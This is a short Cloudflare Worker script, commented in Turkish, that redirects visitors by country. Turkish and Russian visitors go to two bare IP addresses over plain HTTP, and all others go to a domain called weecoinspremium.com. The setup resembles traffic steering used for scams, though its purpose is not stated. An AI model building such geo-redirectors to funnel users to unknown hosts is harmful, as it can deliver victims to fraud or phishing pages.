export default {
    async fetch(request) {
      const country = request.headers.get("cf-ipcountry") || "XX";
  
      // Ülkeye göre yönlendirme IP'leri:
      const redirectionMap = {
        "TR": "http://193.3.167.218", // Türkiye
        "RU": "http://158.255.0.208", // Rusya
      };
  
      if (redirectionMap[country]) {
        return Response.redirect(redirectionMap[country], 302);
      }
  
      // Diğerleri için varsayılan IP
      return Response.redirect("https://weecoinspremium.com", 302);
    }
  };
  